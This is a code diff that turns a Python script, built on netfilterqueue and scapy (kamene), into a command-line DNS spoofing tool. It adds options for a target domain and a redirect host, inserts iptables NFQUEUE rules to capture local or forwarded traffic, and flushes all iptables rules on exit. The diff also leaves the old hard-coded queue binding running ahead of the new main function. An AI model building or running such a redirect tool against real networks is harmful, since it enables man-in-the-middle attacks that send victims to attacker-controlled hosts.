@@ -1,8 +1,48 @@
+#!/usr/bin/env python3
+
+import argparse
+import subprocess
 import re
 
 import netfilterqueue
 import kamene.all as scapy
 
+
+def get_arguments():
+    """
+    Return the arguments:
+    - traffic: Spoof traffic on the [local] machine or [remote] machine
+    - domain: Which domain to spoof traffic for
+    - queue: The queue number to capture packets for
+    """
+
+    # Create parser
+    parser = argparse.ArgumentParser()
+    parser.add_argument("traffic", choices=["local", "remote"], help="Capture traffic on local or remote machine")
+    parser.add_argument("domain", help="Provide a domain to spoof and respond with")
+    parser.add_argument("host", help="Host address to redirect user to")
+    parser.add_argument("-q", "--queue-num", dest="queue", default=0, type=int,
+                        help="Provide the queue number to capture packets for")
+
+    # Parse args
+    arguments = parser.parse_args()
+    return arguments
+
+
+def queue_local_traffic(queue_number):
+    """Capture local traffic to the queue"""
+    subprocess.run(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", str(queue_number)], check=True)
+    subprocess.run(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", str(queue_number)], check=True)
+
+
+def queue_remote_traffic(queue_number):
+    """Capture remote traffic to the queue"""
+    subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", str(queue_number)], check=True)
+
+
+def reset_ip_tables():
+    """Reset IP tables"""
+    subprocess.run(["iptables", "--flush"], check=True)
 
 def set_load(packet, load):
     packet[scapy.Raw].load = load
@@ -48,6 +88,49 @@ def process_packet(packet):
     packet.accept()
 
 
+
+
+
 queue = netfilterqueue.NetfilterQueue()
 queue.bind(0, process_packet)
 queue.run()
+
+
+def main(args):
+    traffic = args.traffic
+    domain = args.domain
+    host = args.host
+    queue_number = args.queue
+
+    queue = None
+    try:
+        if traffic == "local":
+            queue_local_traffic(queue_number)
+            print(f"[+] Capturing local traffic in Queue {queue_number}.")
+        elif traffic == "remote":
+            queue_remote_traffic(queue_number)
+            print(f"[+] Capturing remote traffic in Queue {queue_number}.")
+
+        # Initialize DNS Spoofer instance with variable content
+        dns_spoofer = DNSSpoofer(domain, host)
+
+        # Bind queue
+        queue = netfilterqueue.NetfilterQueue()
+        queue.bind(queue_number, dns_spoofer.process_packet)
+
+        print(f"[+] Successfully binded to Queue {queue_number}")
+        queue.run()
+
+    except KeyboardInterrupt:
+        print("\n[-] Detected CTRL + C ..... Resetting IP tables ..... Please wait..")
+    except Exception as e:
+        print(f"[-] Exception caught: {str(e)} ..... Resetting IP tables ..... Please wait..")
+    finally:
+        if queue:
+            queue.unbind()
+        reset_ip_tables()
+
+
+if __name__ == "__main__":
+    args = get_arguments()
+    main(args)
